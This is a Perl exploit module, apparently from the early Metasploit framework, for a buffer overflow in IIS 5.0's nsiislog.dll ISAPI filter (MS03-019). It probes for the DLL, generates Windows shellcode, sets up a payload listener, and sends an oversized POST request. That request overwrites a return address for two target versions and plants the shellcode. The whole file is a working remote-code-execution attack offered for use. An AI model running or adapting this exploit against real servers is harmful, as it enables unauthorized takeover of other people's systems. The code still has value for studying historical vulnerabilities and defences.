use IO::Socket;
use Pex;

##
#
$Name = "IIS 5.0 nsiislog.dll POST Overflow";
$Version = "1.0";
$Author = "H D Moore";
$URL = "http://www.metasploit.com/";
$Group = "IIS";
$Description = "This exploits a buffer overflow found in the nsiislog.dll ISAPI ".
               "filter that comes with Windows Media Server. This module will ".
               "also work against the 'patched' MS03-019 version. Some minor problems ".
               "have been encountered exploiting a Windows 2000 SP2 system, the ebx ".
               "register does not point to the same place as the other service packs. ".
               "Please see the following URL for more information on this vulnerability.\n\n".
               "http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0120.html";
#
##

my $pex = Pex->new();
my $pay = {};

sub Init {
    my ($obj) = @_;
    $obj->NeedPayload(1);
    $obj->Payloads();
}

sub Payloads {
    my ($obj, $opt) = @_;
    my $x = $pex->Payloads();
    
    # win32 exploit, load the payloads
    my $wincode = $x->{"x86"}->{"win32"};
    foreach my $s (keys(%{ $wincode }))
    {
        my $name = $wincode->{$s}->{"NAME"};
        
        # only load payloads that do not require admin access
        if (! $wincode->{$s}->{"PRIV"})
        {
            $pay->{$name} = $wincode->{$s};
        }
    }
     
    return $pay;
}

sub Check {
    my ($obj, $opt) = @_;
   
    my $s = IO::Socket::INET->new (
                Proto => "tcp",
                PeerAddr => $opt->{"RHOST"},
                PeerPort => $opt->{"RPORT"},
                Type => SOCK_STREAM
    );

    if (! $s)
    {
        return "Could not conect to " . $opt->{"RHOST"} . ":" . $opt->{"RPORT"} . " -> $!";
    }
 
    print $s "GET /scripts/nsiislog.dll HTTP/1.1\r\nHost: " .
             $opt->{"RHOST"} . ":" . $opt->{"RPORT"} . "\r\n\r\n";

    my $found = 0;
    while (<$s>) { if(/NetShow ISAPI/){ $found++ } }
    close ($s);

    if ($found)
    {
        return "Found /scripts/nsiislog.dll :)";
    } else {
        return "The nsiislog.dll ISAPI does not appear to be installed.";
    }

    return $banner;
}

sub Options {
    my ($obj, $payload) = @_;
    my $res = {};
      
    $res->{"RHOST"} = [1, "The target system's ip address."];
    $res->{"RPORT"} = [1, "The port that IIS is running on."];    
    
    foreach my $popt (keys (%{ $pay->{$payload}->{"ARGS"} }))
    {
        $res->{$popt} = $pay->{$payload}->{"ARGS"}->{$popt};
    }
    return $res;
}

sub SetupPayload {
    my ($opt) = @_;

    my $payload = $pay->{$opt->{"PAYLOAD"}};
    my (undef, $parch, $pos, $pname) = split(/\_/, $payload->{"METH"});
    if (! $pname)
    {
        print "[*] No such payload exists.\n";
        return (undef);
    }
    
    print "[*] Generating payload " . $opt->{"PAYLOAD"} . " ($parch, $pos, $pname)...\n";
    
    my $shellcode = $pex->EasySC("\x00+&=%\x0a\x0d\x20", 512, $parch, $pos, $pname, $opt);

    if ($shellcode)
    {
        print "[*] Payload generation complete (" . length($shellcode) . " bytes)\n";
    } else {
        print "[*] Error generating payload: " . $pex->Error() . "\n";
        return (undef);
    }

    my $listener;
    my $handler = $payload->{"SHELL"};
      
    if ($handler)
    { 
        $listener = $pex->$handler($opt);
        if ($listener == 0) { return undef }
        return ($shellcode, $listener);
    }
    
    # other payloads fork to maintain compatibility
    $listener = $$;
    my $exploit = fork();
    if (! $exploit) { return ($shellcode, $listener) }
    while (waitpid($exploit, WNOHANG) == 0) { sleep(1) }
    return(undef);

}

sub Exploit {
    my ($obj, $opt) = @_;

    select(STDOUT);$|++;

    if (! $opt->{"RHOST"}) { $opt->{"RHOST"} = "127.0.0.1" }
    if (! $opt->{"RPORT"}) { $opt->{"RPORT"} = 80 }

    my $target_host = $opt->{"RHOST"};
    my $target_port = $opt->{"RPORT"};
 
    my ($shellcode, $listener) = SetupPayload($opt);
    if (! defined($shellcode)) { return; }

    my @targets = 
    (
        ["ms03-019--",  9769,  9765,  9773, 0x40f01333],
        ["ms03-019++", 13869, 13865, 13873, 0x40f01353]
    );
    

    foreach my $target (@targets)
    {
        print "\n[*] Attempting to exploit target " . $target->[0] . "\n";

        my $request = 
        "POST /scripts/nsiislog.dll HTTP/1.1\r\n".
        "Host: " . $opt->{"RHOST"} . ":" . $opt->{"RPORT"} . "\r\n".
        "User-Agent: NSPlayer/2.0\r\n".
        "Content-Type: application/x-www-form-urlencoded\r\n";

        my @fields = split(/\s+/, "date time c-dns cs-uri-stem c-starttime ".
                                  "x-duration c-rate c-status c-playerid c-playerversion ".
                                  "c-playerlanguage cs(User-Agent) cs(Referer) c-hostexe ");                         
        my $boom;
        foreach my $var (@fields) { $boom .= "$var=BOOM&"; }

        my $pattern = $pex->PatternCreate("65535");

        substr($pattern, $target->[1], 4, pack("L", $target->[4]));
        substr($pattern, $target->[2], 4, "\xeb\x08\xeb\x08");
        substr($pattern, $target->[3], 500, $shellcode);

        $boom .= "c-ip=" . $pattern;
        $request .= "Content-Length: " . length($boom) . "\r\n\r\n" . $boom;
        
        my $s = IO::Socket::INET->new (
                Proto => "tcp",
                PeerAddr => $opt->{"RHOST"},
                PeerPort => $opt->{"RPORT"},
                Type => SOCK_STREAM
        );

        if (! $s)
        {
            print "[*] Could not connect to target: $!\n";
            exit(0);
        }

        print "[*] Sending " .length($request) . " bytes to remote host.\n";
        print $s $request;
        
        print "[*] Waiting for a response...\n";
        my $r = <$s>;
        
        sleep(2);
    }
    
    exit(0);
}
